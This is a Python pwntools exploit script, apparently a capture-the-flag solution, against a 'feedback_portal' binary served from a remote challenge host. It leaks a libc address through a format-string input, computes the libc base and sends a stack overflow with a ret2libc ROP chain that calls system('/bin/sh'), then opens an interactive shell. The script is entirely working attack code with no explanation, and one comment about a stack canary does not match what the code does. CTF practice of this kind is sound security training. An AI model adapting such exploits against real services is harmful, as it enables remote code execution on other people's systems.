#!/usr/bin/env python3
from pwn import *

elf = context.binary = ELF('./feedback_portal', checksec=False)
libc = ELF('./libc.so.6', checksec=False)

#canary is the 23rd element that gets printed from the stack when using %p... as name
libcIDX = 11
OFFSET_TO_RIP = 136
RET = 0x000000000040101a
binsh_offset = next(libc.search(b"/bin/sh"))
rop = ROP(libc)
pop_rdi = rop.find_gadget(["pop rdi", "ret"]).address

#p = process(elf.path)
p = remote("offsec.m0lecon.it", 13576)

p.recvuntil(b'name:\n')
#gets canary for this execution
p.sendline(f"%{libcIDX}$lx".encode())

data = p.recvuntil(b'Now leave your feedback:')

#log.info(f"raw:\n{data.decode(errors='ignore')}")
text = data.decode()
#print(text)

leak = "0x" + text.split("Hello, ")[1].split()[0]
leak = int(leak, 16)

offset = libc.symbols["_IO_2_1_stderr_"]
libc_base = leak - offset
#print(hex(offset))
#print(hex(leak))
print(hex(libc_base))

system_addr = libc.symbols['system']
#p.recvuntil(b'feedback:\n')
stage2 = flat(
b'A' * OFFSET_TO_RIP,
p64(RET),
p64(libc_base + pop_rdi),
p64(binsh_offset+libc_base), # address of "/bin/sh"
p64(libc_base+system_addr), # address of system
)
p.send(stage2)
p.interactive()
